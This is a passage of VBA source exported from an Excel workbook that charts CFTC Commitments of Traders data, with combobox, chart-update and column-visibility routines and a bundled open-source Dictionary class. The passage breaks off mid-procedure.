Attribute VB_Name = "AUD"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "CAD"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "CHF"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Chart_Sheet"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "Sheet_Selection, 1, 0, MSForms, ComboBox"
Option Explicit
'Private Sub Worksheet_Activate()
'
'Dim RR As Range
'
'Set RR = Me.Range(Me.Shapes("Charts").TopLeftCell, Me.Cells(Me.Shapes("Charts").TopLeftCell.Row, Me.Shapes("Charts").BottomRightCell.Column))
'RR.Select
'ActiveWindow.Zoom = True
''Call ZoomToRange(RR, True)
'
'End Sub
Private Sub Worksheet_Deactivate()

Dim RR As Range: Set RR = Me.Range("A2")
    
If WorksheetFunction.CountA(RR) = 1 Then RR.ClearContents

End Sub
Private Sub Sheet_Selection_Click()

If ThisWorkbook.Procedure_Active = False Then

    With Me
    
        Select Case Me.Sheet_Selection.Value
            
            Case HUB.Name, Weekly.Name, Chart_Sheet.Name, Variable_Sheet.Name 'do nothing
            
            Case Else
            
                Application.Run "'" & ThisWorkbook.Name & "'!Update_Charts" 'update charts
                
                .Range("A2").Value2 = .Sheet_Selection.Value 'save value from combobox to worksheet
                
                If Me Is ActiveSheet Then .Range("A1").Select 'if on the Charts sheet then select a range to move cursor out of combobox
    
        End Select
    
    End With

End If

End Sub
Private Sub Sheet_Selection_GotFocus()

'ThisWorkbook.Procedure_Active = True

With Me
    .Sheet_Selection.Text = vbNullString 'when clicking inside the combobox, clear the text value
    
    .Sheet_Selection.DropDown 'open the dropdown menu
End With

'ThisWorkbook.Procedure_Active = True

End Sub
Private Sub GoToSheet()
    ThisWorkbook.Worksheets(Me.Sheet_Selection.Value).Activate 'go to the specified sheet
End Sub
Private Sub Sheet_Selection_LostFocus()

With Me
    
    ThisWorkbook.Procedure_Active = True

        .Sheet_Selection.Text = .Range("A2").Value2 'replace value since it was cleared when it was clicked
    
    ThisWorkbook.Procedure_Active = False

End With

End Sub

Attribute VB_Name = "Chart_Stuff"
Private Function Get_Worksheet_Info() As Variant 'retrieve destination info

Dim I As Long, R As Long, This_C As New Dictionary, Contract_WS_Name As String, Keys_A() As Variant, _
TWOA() As Variant, TB As ListObject, SH As Worksheet, EVNT As Boolean, Code As String, Item As Variant

'Dim H As Double
'H = Timer

Const Locator_STR As String = "CFTC_Contract_Market_Code"

With Application
     EVNT = .EnableEvents
            .EnableEvents = False
End With

This_C.CompareMode = TextCompare

On Error GoTo Invalid_Worksheet_Table

For Each SH In ThisWorkbook.Worksheets
    
    Select Case True
    
        Case SH Is Weekly, SH Is HUB, SH Is Variable_Sheet, SH Is Chart_Sheet, SH Is QueryT
        
        Case Else
        
            With SH
                
                Set TB = CFTC_Table(ThisWorkbook, SH) 'Finds a table on the specified sheet with Locator_STR in the header row

                If Not TB Is Nothing Then 'TB is found based on if Locator_STR is in the the header row
                
                    With TB
                        
                        I = WorksheetFunction.Match(Locator_STR, .HeaderRowRange.Value2, 0)
                        
                        'No error will be returned from the above, So just find the column Number of the target header
                        
                        With .DataBodyRange
                       
                            Code = .Cells(.Rows.count, I).Value2 'take Code from the bottom row of the table
                        
                        End With
                        
                    End With
                    
                    If Code <> vbNullString Then
                    
                        Contract_WS_Name = .Name
                        
                        This_C.Add LCase(Contract_WS_Name), Array(Code, .Index, Contract_WS_Name)
                            'LCASE used for A-Z sorting
                    End If
                    
                End If
            
            End With
            
    End Select
    
Resume_WS_Loop:

Next SH

Set TB = Nothing:   Set SH = Nothing:   Contract_WS_Name = vbNullString: Code = vbNullString

On Error GoTo 0

With This_C
    
    Keys_A = .Keys

    Call Quicksort(Keys_A, LBound(Keys_A), UBound(Keys_A))

    ReDim TWOA(1 To UBound(Keys_A) + 1, 1 To 3) 'store all arrays in a single array
    
    For I = 1 To UBound(TWOA)
    
        Item = .Item(Keys_A(I - 1))
        
        For R = LBound(TWOA, 2) To UBound(TWOA, 2)
        
            TWOA(I, R) = Item(R - 1)
            
        Next R
    
    Next I
    
End With

Erase Keys_A:  Erase Item:  Set This_C = Nothing

Set TB = Variable_Sheet.ListObjects("Table_WSN")

With TB 'place array on worksheet

    With .DataBodyRange
    
        I = .Rows.count
        
        If I > UBound(TWOA, 1) Then .ClearContents 'clear contents if the # of rows aren't equal

        .Resize(UBound(TWOA, 1), UBound(TWOA, 2)).Value2 = TWOA   'apply array to worksheet

    End With

    If I > UBound(TWOA, 1) Then .Resize .Range.CurrentRegion
        'resize to fit current region if table has too many rows
End With

Get_Worksheet_Info = TWOA
Application.EnableEvents = EVNT

'Debug.Print Timer - H

Exit Function

Invalid_Worksheet_Table:

    Err.Clear
    Resume Resume_WS_Loop

End Function
Private Sub Update_List(Optional All_Sheets_Combobox As ComboBox, Optional Charts_ComboBox As ComboBox, Optional Disable As Boolean = False)

Dim Worksheet_Name As Variant, All_Sheets As New Dictionary, SH As Worksheet, WSNA() As Variant, WSN As String, Z As Long

With Application 'load worksheet names that have CFTC codes on them to an array
    Worksheet_Name = .Index(.Run("'" & ThisWorkbook.Name & "'!Get_Worksheet_Info"), 0, 3)
End With
    
#If Mac Then

#Else

    If All_Sheets_Combobox Is Nothing Then Set All_Sheets_Combobox = HUB.Sheet_Selection
    'default this combobox to the one on the HUB
    If Charts_ComboBox Is Nothing And Disable = False Then
    
        Set Charts_ComboBox = Chart_Sheet.Sheet_Selection 'optional control boolean
    
        With Charts_ComboBox
            
            .List = Worksheet_Name: Erase Worksheet_Name 'add worksheet name that have data only [already sorted]
                
            .AddItem "{Select a Worksheet}" ' add this to the bottom
            
        End With
    
    End If

#End If

With All_Sheets 'This Dictionary will hold most sheet names

    For Each SH In ThisWorkbook.Worksheets 'loop through worksheets and store worksheet names in a dictionary
       
        WSN = SH.Name
        
        Select Case True
        
            Case SH Is QueryT
            
            Case SH Is Variable_Sheet
                
                If UUID Then .Add LCase(WSN), WSN 'only add the variable sheet to the list if on my computer
            
            Case Else
            
                 .Add LCase(WSN), WSN
            
        End Select
       
    Next SH

    WSNA = .Keys 'Will be used to sort
            
    Quicksort WSNA, LBound(WSNA), UBound(WSNA) 'Sort A-Z
                                         
    For Z = LBound(WSNA) To UBound(WSNA) 'The quicksort function has trouble with capital letters
        WSNA(Z) = .Item(WSNA(Z))         'Overwrite Key array elements with the corresponding dictionary item
    Next Z
    
End With
        
With All_Sheets_Combobox

    .List = WSNA
    
   If Not All_Sheets_Combobox Is Navigation.S_Selection Then
    'last item in dropdown won't work properly if typed without the following
        If UUID Then
            .AddItem "Big Anime Titties"
        Else
            .AddItem "-----------------------------------------"
        End If
        
    End If
    
End With

Set All_Sheets = Nothing
Set All_Sheets_Combobox = Nothing
Set Charts_ComboBox = Nothing

End Sub
Private Sub Update_Charts(Optional Worksheet_Name As String) 'changing Chart Data

Dim TT As Long, AR As Range, HAT() As Variant, Date_Range As Range, Item As ChartObject, SS As Series, _
ERF As String, Chart_Source As Worksheet ', DD As Double

Select Case Worksheet_Name
    Case Weekly.Name, Variable_Sheet.Name, HUB.Name, Chart_Sheet.Name
    End
End Select
'DD = Timer
#If Mac Then

#Else
    If Worksheet_Name = vbNullString Then Worksheet_Name = Chart_Sheet.Sheet_Selection.Value
#End If

On Error GoTo No_Table

Set Chart_Source = ThisWorkbook.Worksheets(Worksheet_Name)

With CFTC_Table(ThisWorkbook, Chart_Source)

    Set AR = .DataBodyRange

    HAT = .HeaderRowRange.Value2

End With

Set Date_Range = AR.Columns(1)
    
Application.ScreenUpdating = False

On Error GoTo Chart_Data_NFound

For Each Item In Chart_Sheet.ChartObjects 'for each chart

    For Each SS In Item.Chart.FullSeriesCollection 'for each series on that chart
        With SS
            TT = Range(Split(Split(.Formula, ",")(2), ":")(1)).Column
                .XValues = Date_Range
                .Values = AR.Columns(TT)
                .Name = HAT(1, TT)
        End With
Skip_Series:
    Next SS
            'split formula with a comma ; split element 2 base 0 with a ":" ; element 1 of new string is the target column
            'use .column to find the column index
Next Item

If ThisWorkbook.Procedure_Active = False Then Application.ScreenUpdating = True

If ERF <> vbNullString Then MsgBox ERF

Set Item = Nothing
Set AR = Nothing

Exit Sub

No_Table:

    MsgBox "Table was not found in cell A1 on sheet " & Worksheet_Name
    Exit Sub

Chart_Data_NFound:

    ERF = ERF & "No data found for " & Worksheet_Name & ": " & SS.Name & " on chart " & _
    Item.Chart.ChartTitle.Text & vbNewLine
    
    Err.Clear
    
    Resume Skip_Series
    
End Sub
Attribute VB_Name = "Column_Visibility"
Attribute VB_Base = "0{A52FB56C-0B0A-47AC-A400-F8FEB4604D7B}{131E8B19-1416-49E6-BDAA-0D6DF2BB69F8}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Private Sub UserForm_Initialize()

Dim WS_Name As String, Z As Long, NeW_Checkbox As MSForms.CheckBox, Field_W As Double, _
Previous_CB As MSForms.CheckBox, Info_Array() As Variant

Const Grid_Size As Long = 2 '2 columns of Checkboxes will be created

With Variable_Sheet.ListObjects("Table_WSN").DataBodyRange 'Table that holds valid Worksheet Names

    On Error Resume Next

    Do 'this attempts to find at least 1 valid sheet in the table in case the user has deleted worksheets since opening the file
        If Err.Number <> 0 Then Err.Clear
        
        Z = Z + 1
        
        WS_Name = .Cells(Z, 3).Value2 'Worksheet Name
        
        Info_Array = ThisWorkbook.Worksheets(WS_Name).Range("A3").ListObject.HeaderRowRange.Value2
             
    Loop Until Err.Number = 0 Or Z = .Rows.count + 1 'if you have exhausted the table elements
    
    If Z = .Rows.count + 1 Then
    
        MsgBox "No valid sheets found. If you have renamed all the sheets since opening the file, then run the Update List macro from the Charts Worksheet and try again." & vbNewLine & vbNewLine & _
        " If the error persists, then message MoshiM with the message: Table_WSN not found [Columns Macro] ."
        End
    
    End If
    
End With

Application.ScreenUpdating = False

On Error GoTo 0

Field_W = Me.Fields.Width / 2 'Current Width of the Frame

For Z = 0 To UBound(Info_Array, 2) - 1 'Controls start at 0

    Set NeW_Checkbox = Me.Fields.Controls.Add("Forms.CheckBox.1", "Field_" & Z, True)
            'Name of Checkbox will be used for determining if it is on or not in other subs
    With NeW_Checkbox

        If Z >= 1 Then 'if there is at least one Checkbox already added to the frame[Remember that Z starts at 0]
            
            Set Previous_CB = Me.Fields.Controls("Field_" & Z - 1)
            
            If Z Mod Grid_Size <> 0 Then    'Place on current row of Frame
                .Top = Previous_CB.Top
                .Left = Field_W             'place at halfway point of the frame
                .Width = Field_W            'Occupy the rest of the frame width to the right[Only works with grid size=2]
            Else 'place on next row of Frame
                .Top = Previous_CB.Top + Previous_CB.Height
                .Left = 0
                .Width = Field_W
            End If
            
        Else 'If the very first added checkbox
            .Width = Field_W
            .Top = 10
            .Left = 0
        End If
        
        .BackColor = RGB(255, 255, 255) 'White
        .ForeColor = RGB(0, 0, 0)       'Black
        .Caption = Info_Array(1, Z + 1) 'Caption taken from headers of the specified table[Array is 1-based]
        '.TextAlign=fmTextAlignLeft     'Align text to the left
        .Enabled = True                 'Clickable
        .Locked = False
        .WordWrap = False
 
    End With
    
Next Z
'Z will be one more than the bouds of the loop so it is now equal to the toatl number of added Checkboxes

Field_W = NeW_Checkbox.Height 'Height of the last made checkbox[Same for all prior checkboxes]

Me.Fields.ScrollHeight = ((Z * Field_W) / Grid_Size) + (Field_W / 2)
'Combined height of all Checkboxes/ #of columns + A little extra space

Application.ScreenUpdating = True

End Sub
Private Sub Run_Click()
'_______________________________________
'Only workss for columns A to ZZ
'---------------------------------------
Dim WS As Worksheet, Fields As Variant, Z As Long, WS_Headers As Range, Column_Found As Long, ERF As String, _
Y As Long, These_On() As Variant, Temp() As Variant, Column_Info() As Variant, X As Long, M As Long, Info_Array() As Variant

Application.ScreenUpdating = False

ReDim These_On(0 To Me.Fields.Controls.count - 1, 1 To 2) 'redim to hold the number of controls
                                                          'start array at 0
For Z = 0 To UBound(These_On, 1) 'loop through all controls

    With Me.Fields.Controls("Field_" & Z)
    
        If .Value = True Then 'if activated
                    
            These_On(Z, 1) = True 'store true in column 1
            These_On(Z, 2) = .Caption 'store the caption in column 2
        
        End If
        
    End With
    
Next Z

Info_Array = Variable_Sheet.ListObjects("Table_WSN").DataBodyRange.Columns(3).Value2 'Valid Worksheets

ReDim Column_Info(1 To 2, 1 To 1)

For Z = 1 To UBound(Info_Array, 1)  'loop each valid worksheet
    
    Set WS = ThisWorkbook.Worksheets(Info_Array(Z, 1))
    
    With WS
        'IF either of the "Selected" Option buttons are on
        If (Me.Unhide_Selected.Value = True Or Me.Hide_Selected.Value = True) Then
                      
            .DisplayPageBreaks = False
            
            On Error GoTo No_Table_Error
            
            Temp = .Range("A3").ListObject.HeaderRowRange.Value2
            'Headers from the current worksheet ; Will generate an error if no table
            
            M = UBound(Temp, 2)
                            
            If UBound(Column_Info, 2) <> UBound(Temp, 2) Then
            
                ReDim Column_Info(1 To 2, 1 To UBound(Temp, 2))
            
                For Y = 1 To UBound(Temp, 2) 'Add headers and cell addresses to array
                
                    Column_Info(1, Y) = Temp(1, Y) 'Headers from the specified table...Place in 1st row of array
                    
                    '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
                    'THE FOLLOWING CONDITIONAL COULD BE SIMPLY REPLACED WITH RANGE.ADDRESS BUT I'm unsure of the Performance ipact
                    'LETTERING WOULD START AT 'A'
                    '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
                    If Y <= 26 Then 'if on first loop of the alphabet
    
                        Column_Info(2, Y) = Chr(65 + Y - 1) & 1 'specify Cell Address
                        
                    Else
                            
                        If Y Mod 26 <> 0 Then 'if not the 26th letter of the alphabet
                        
                            X = WorksheetFunction.RoundDown(Y / 26, 0)
                        Else 'if on some other loop of the alphabet
                            X = WorksheetFunction.RoundDown(Y / 26, 0) - 1
                            'ensures X doesn't prematurely change at the end of each alphabet loop
                        End If
                            
                        Column_Info(2, Y) = Replace(Column_Info(2, X), 1, vbNullString) & Chr((((Y Mod 91) - 1) Mod 26) + 65) & 1
                    
                    End If 'End conditional Y value check
                    
                Next Y
                                            
            End If
            
            On Error GoTo No_Column_Found
            
            For Y = 0 To UBound(These_On, 1) 'loop through check box values and captions
            
                If These_On(Y, 1) = True Then 'if checkbox is on
                    
                    Column_Found = WorksheetFunction.Match(These_On(Y, 2), Temp, 0) 'find the column_number
                     
                    ERF = ERF & "," & Column_Info(2, Column_Found)

                End If 'End conditional check if the specified checkbox is on
                
Next_Column_Loop:

            Next Y
                    
            Erase Temp 'De-allocate from memory
            
            If ERF <> vbNullString Then 'if any of the selected captions were found on the current sheet
    
                ERF = Replace(ERF, ",", vbNullString, 1, 1) 'remove the omma from the very start of the string
    
                If Hide_Selected.Value = True Then 'hise specified range
    
                    .Range(ERF).EntireColumn.Hidden = True
    
                ElseIf Unhide_Selected.Value = True Then 'unhide specified range
    
                    .Range(ERF).EntireColumn.Hidden = False
    
                End If
    
                ERF = vbNullString
    
            End If 'end check for if string is populated ie: if the caption exists within the headers of the current table
    
        ElseIf (Me.Hide_All.Value = True Or Me.Unhide_All.Value = True) And Err.Number = 0 Then 'if "ALL" Option buttons
                
            If Me.Hide_All.Value = True Then
            
                .UsedRange.Columns.EntireColumn.Hidden = True
                
            ElseIf Me.Unhide_All.Value = True Then
            
                .UsedRange.Columns.EntireColumn.Hidden = False
                
            End If
    
        End If 'End conditional option button value check
        
    End With 'end use of worksheet object
    
Next_Worksheet:

Next Z

Application.ScreenUpdating = True

Exit Sub

No_Column_Found:
    Err.Clear
    Resume Next_Column_Loop
    
No_Table_Error:
    Err.Clear
    Resume Next_Worksheet
End Sub
Private Sub Select_All_Click()

Dim CHKBX As MSForms.CheckBox

Application.ScreenUpdating = False

For Each CHKBX In Me.Fields.Controls

    CHKBX.Value = True
    
Next
    
Application.ScreenUpdating = True

End Sub
Private Sub Unselect_All_Click()

Dim CHKBX As MSForms.CheckBox

Application.ScreenUpdating = False

For Each CHKBX In Me.Fields.Controls

    CHKBX.Value = False
    
Next
    
Application.ScreenUpdating = True

End Sub
Sub GG()
For Each Control In Scripts.Controls
    Control.Width = 156
Next
End Sub

Attribute VB_Name = "Dictionary"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
''
' Dictionary v1.4.0
' (c) Tim Hall - https://github.com/timhall/VBA-Dictionary
'
' Drop-in replacement for Scripting.Dictionary on Mac
'
' @author: tim.hall.engr@gmail.com
' @license: MIT (http://www.opensource.org/licenses/mit-license.php
'
' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ '
Option Explicit

' --------------------------------------------- '
' Constants and Private Variables
' --------------------------------------------- '

#Const UseScriptingDictionaryIfAvailable = True

#If Mac Or Not UseScriptingDictionaryIfAvailable Then

' dict_KeyValue 0: FormattedKey, 1: OriginalKey, 2: Value
Private dict_pKeyValues As Collection
Private dict_pKeys() As Variant
Private dict_pItems() As Variant
Private dict_pObjectKeys As Collection
Private dict_pCompareMode As CompareMethod

#Else

Private dict_pDictionary As Object

#End If

' --------------------------------------------- '
' Types
' --------------------------------------------- '

Public Enum CompareMethod
    BinaryCompare = VBA.vbBinaryCompare
    TextCompare = VBA.vbTextCompare
    DatabaseCompare = VBA.vbDatabaseCompare
End Enum

' --------------------------------------------- '
' Properties
' --------------------------------------------- '

Public Property Get CompareMode() As CompareMethod
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    CompareMode = dict_pCompareMode
#Else
    CompareMode = dict_pDictionary.CompareMode
#End If
End Property
Public Property Let CompareMode(Value As CompareMethod)
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    If Me.count > 0 Then
        ' Can't change CompareMode for Dictionary that contains data
        ' http://msdn.microsoft.com/en-us/library/office/gg278481(v=office.15).aspx
        Err.Raise 5 ' Invalid procedure call or argument
    End If

    dict_pCompareMode = Value
#Else
    dict_pDictionary.CompareMode = Value
#End If
End Property

Public Property Get count() As Long
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    count = dict_pKeyValues.count
#Else
    count = dict_pDictionary.count
#End If
End Property

Public Property Get Item(Key As Variant) As Variant
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    Dim dict_KeyValue As Variant
    dict_KeyValue = dict_GetKeyValue(Key)

    If Not IsEmpty(dict_KeyValue) Then
        If VBA.IsObject(dict_KeyValue(2)) Then
            Set Item = dict_KeyValue(2)
        Else
            Item = dict_KeyValue(2)
        End If
    Else
        ' Not found -> Returns Empty
    End If
#Else
    If VBA.IsObject(dict_pDictionary.Item(Key)) Then
        Set Item = dict_pDictionary.Item(Key)
    Else
        Item = dict_pDictionary.Item(Key)
    End If
#End If
End Property
Public Property Let Item(Key As Variant, Value As Variant)
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    If Me.Exists(Key) Then
        dict_ReplaceKeyValue dict_GetKeyValue(Key), Key, Value
    Else
        dict_AddKeyValue Key, Value
    End If
#Else
    dict_pDictionary.Item(Key) = Value
#End If
End Property
Public Property Set Item(Key As Variant, Value As Variant)
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    If Me.Exists(Key) Then
        dict_ReplaceKeyValue dict_GetKeyValue(Key), Key, Value
    Else
        dict_AddKeyValue Key, Value
    End If
#Else
    Set dict_pDictionary.Item(Key) = Value
#End If
End Property

Public Property Let Key(Previous As Variant, Updated As Variant)
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    Dim dict_KeyValue As Variant
    dict_KeyValue = dict_GetKeyValue(Previous)

    If Not VBA.IsEmpty(dict_KeyValue) Then
        dict_ReplaceKeyValue dict_KeyValue, Updated, dict_KeyValue(2)
    End If
#Else
    dict_pDictionary.Key(Previous) = Updated
#End If
End Property

' ============================================= '
' Public Methods
' ============================================= '

''
' Add an item with the given key
'
' @param {Variant} Key
' @param {Variant} Item
' --------------------------------------------- '
Public Sub Add(Key As Variant, Item As Variant)
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    If Not Me.Exists(Key) Then
        dict_AddKeyValue Key, Item
    Else
        ' This key is already associated with an element of this collection
        Err.Raise 457
    End If
#Else
    dict_pDictionary.Add Key, Item
#End If
End Sub

''
' Check if an item exists for the given key
'
' @param {Variant} Key
' @return {Boolean}
' --------------------------------------------- '
Public Function Exists(Key As Variant) As Boolean
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    Exists = Not IsEmpty(dict_GetKeyValue(Key))
#Else
    Exists = dict_pDictionary.Exists(Key)
#End If
End Function

''
' Get an array of all items
'
' @return {Variant}
' --------------------------------------------- '
Public Function Items() As Variant
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    If Me.count > 0 Then
        Items = dict_pItems
    Else
        ' Split("") creates initialized empty array that matches Dictionary Keys and Items
        Items = VBA.Split("")
    End If
#Else
    Items = dict_pDictionary.Items
#End If
End Function

''
' Get an array of all keys
'
' @return {Variant}
' --------------------------------------------- '
Public Function Keys() As Variant
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    If Me.count > 0 Then
        Keys = dict_pKeys
    Else
        ' Split("") creates initialized empty array that matches Dictionary Keys and Items
        Keys = VBA.Split("")
    End If
#Else
    Keys = dict_pDictionary.Keys
#End If
End Function

''
' Remove an item for the given key
'
' @param {Variant} Key
' --------------------------------------------- '
Public Sub Remove(Key As Variant)
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    Dim dict_KeyValue As Variant
    dict_KeyValue = dict_GetKeyValue(Key)

    If Not VBA.IsEmpty(dict_KeyValue) Then
        dict_RemoveKeyValue dict_KeyValue
    Else
        ' Application-defined or object-defined error
        Err.Raise 32811
    End If
#Else
    dict_pDictionary.Remove Key
#End If
End Sub

''
' Remove all items
' --------------------------------------------- '
Public Sub RemoveAll()
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    Set dict_pKeyValues = New Collection

    Erase dict_pKeys
    Erase dict_pItems
#Else
    dict_pDictionary.RemoveAll
#End If
End Sub

' ============================================= '
' Private Functions
' ============================================= '

#If Mac Or Not UseScriptingDictionaryIfAvailable Then

Private Function dict_GetKeyValue(dict_Key As Variant) As Variant
    On Error Resume Next
    dict_GetKeyValue = dict_pKeyValues(dict_GetFormattedKey(dict_Key))
    Err.Clear
End Function

Private Sub dict_AddKeyValue(dict_Key As Variant, dict_Value As Variant, Optional dict_Index As Long = -1)
    If Me.count = 0 Then
        ReDim dict_pKeys(0 To 0)
        ReDim dict_pItems(0 To 0)
    Else
        ReDim Preserve dict_pKeys(0 To UBound(dict_pKeys) + 1)
        ReDim Preserve dict_pItems(0 To UBound(dict_pItems) + 1)
    End If

    Dim dict_FormattedKey As String
    dict_FormattedKey = dict_GetFormattedKey(dict_Key)

    If dict_Index >= 0 And dict_Index < dict_pKeyValues.count Then
        ' Shift keys/items after + including index into empty last slot
        Dim dict_i As Long
        For dict_i = UBound(dict_pKeys) To dict_Index + 1 Step -1
            dict_pKeys(dict_i) = dict_pKeys(dict_i - 1)
            If VBA.IsObject(dict_pItems(dict_i - 1)) Then
                Set dict_pItems(dict_i) = dict_pItems(dict_i - 1)
            Else
                dict_pItems(dict_i) = dict_pItems(dict_i - 1)
            End If
        Next dict_i

        ' Add key/item at index
        dict_pKeys(dict_Index) = dict_Key
        If VBA.IsObject(dict_Value) Then
            Set dict_pItems(dict_Index) = dict_Value
        Else
            dict_pItems(dict_Index) = dict_Value
        End If

        ' Add key-value at proper index
        dict_pKeyValues.Add Array(dict_FormattedKey, dict_Key, dict_Value), dict_FormattedKey, Before:=dict_Index + 1
    Else
        ' Add key-value as last item
        If VBA.IsObject(dict_Key) Then
            Set dict_pKeys(UBound(dict_pKeys)) = dict_Key
        Else
            dict_pKeys(UBound(dict_pKeys)) = dict_Key
        End If
        If VBA.IsObject(dict_Value) Then
            Set dict_pItems(UBound(dict_pItems)) = dict_Value
        Else
            dict_pItems(UBound(dict_pItems)) = dict_Value
        End If

        dict_pKeyValues.Add Array(dict_FormattedKey, dict_Key, dict_Value), dict_FormattedKey
    End If
End Sub

Private Sub dict_ReplaceKeyValue(dict_KeyValue As Variant, dict_Key As Variant, dict_Value As Variant)
    Dim dict_Index As Long
    Dim dict_i As Integer

    dict_Index = dict_GetKeyIndex(dict_KeyValue(1))

    ' Remove existing dict_Value
    dict_RemoveKeyValue dict_KeyValue, dict_Index

    ' Add new dict_Key dict_Value back
    dict_AddKeyValue dict_Key, dict_Value, dict_Index
End Sub

Private Sub dict_RemoveKeyValue(dict_KeyValue As Variant, Optional ByVal dict_Index As Long = -1)
    Dim dict_i As Long
    If dict_Index = -1 Then
        dict_Index = dict_GetKeyIndex(dict_KeyValue(1))
    End If

    If dict_Index >= 0 And dict_Index <= UBound(dict_pKeys) Then
        ' Shift keys/items after index down
        For dict_i = dict_Index To UBound(dict_pKeys) - 1
            dict_pKeys(dict_i) = dict_pKeys(dict_i + 1)

            If VBA.IsObject(dict_pItems(dict_i + 1)) Then
                Set dict_pItems(dict_i) = dict_pItems(dict_i + 1)
            Else
                dict_pItems(dict_i) = dict_pItems(dict_i + 1)
            End If
        Next dict_i

        ' Resize keys/items to remove empty slot
        If UBound(dict_pKeys) = 0 Then
            Erase dict_pKeys
            Erase dict_pItems
        Else
            ReDim Preserve dict_pKeys(0 To UBound(dict_pKeys) - 1)
            ReDim Preserve dict_pItems(0 To UBound(dict_pItems) - 1)
        End If
    End If

    dict_pKeyValues.Remove dict_KeyValue(0)
    dict_RemoveObjectKey dict_KeyValue(1)
End Sub

Private Function dict_GetFormattedKey(dict_Key As Variant) As String
    If VBA.IsObject(dict_Key) Then
        dict_GetFormattedKey = dict_GetObjectKey(dict_Key)
    ElseIf VarType(dict_Key) = VBA.vbBoolean Then
        dict_GetFormattedKey = IIf(dict_Key, "-1__-1", "0__0")
    ElseIf VarType(dict_Key) = VBA.vbString Then
        dict_GetFormattedKey = dict_Key

        If Me.CompareMode = CompareMethod.BinaryCompare Then
            ' Collection does not have method of setting key comparison
            ' So case-sensitive keys aren't supported by default
            ' -> Approach: Append lowercase characters to original key
            '    AbC -> AbC___b_, abc -> abc__abc, ABC -> ABC_____
            Dim dict_Lowercase As String
            dict_Lowercase = ""

            Dim dict_i As Integer
            Dim dict_Char As String
            Dim dict_Ascii As Integer
            For dict_i = 1 To VBA.Len(dict_GetFormattedKey)
                dict_Char = VBA.Mid$(dict_GetFormattedKey, dict_i, 1)
                dict_Ascii = VBA.Asc(dict_Char)
                If dict_Ascii >= 97 And dict_Ascii <= 122 Then
                    dict_Lowercase = dict_Lowercase & dict_Char
                Else
                    dict_Lowercase = dict_Lowercase & "_"
                End If
            Next dict_i

            If dict_Lowercase <> "" Then
                dict_GetFormattedKey = dict_GetFormattedKey & "__" & dict_Lowercase
            End If
        End If
    Else
        ' For numbers, add duplicate to distinguish from strings
        ' ->  123  -> "123__123"
        '    "123" -> "123"
        dict_GetFormattedKey = VBA.CStr(dict_Key) & "__" & CStr(dict_Key)
    End If
End Function

Private Function dict_GetObjectKey(dict_ObjKey As Variant) As String
    Dim dict_i As Integer
    For dict_i = 1 To dict_pObjectKeys.count
        If dict_pObjectKeys.Item(dict_i) Is dict_ObjKey Then
            dict_GetObjectKey = "__object__" & dict_i
            Exit Function
        End If
    Next dict_i

    dict_pObjectKeys.Add dict_ObjKey
    dict_GetObjectKey = "__object__" & dict_pObjectKeys.count
End Function

Private Sub dict_RemoveObjectKey(dict_ObjKey As Variant)
    Dim dict_i As Integer
    For dict_i = 1 To dict_pObjectKeys.count
        If dict_pObjectKeys.Item(dict_i) Is dict_ObjKey Then
            dict_pObjectKeys.Remove dict_i
            Exit Sub
        End If
    Next dict_i
End Sub

Private Function dict_GetKeyIndex(dict_Key As Variant) As Long
    Dim dict_i As Long
    For dict_i = 0 To UBound(dict_pKeys)
        If VBA.IsObject(dict_pKeys(dict_i)) And VBA.IsObject(dict_Key) Then
            If dict_pKeys(dict_i) Is dict_Key Then
                dict_GetKeyIndex = dict_i
                Exit For
            End If
        ElseIf VBA.IsObject(dict_pKeys(dict_i)) Or VBA.IsObject(dict_Key) Then
            ' Both need to be objects to check equality, skip
        ElseIf dict_pKeys(dict_i) = dict_Key Then
            dict_GetKeyIndex = dict_i
            Exit For
        End If
    Next dict_i
End Function

#End If

Private Sub Class_Initialize()
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    Set dict_pKeyValues = New Collection

    Erase dict_pKeys
    Erase dict_pItems
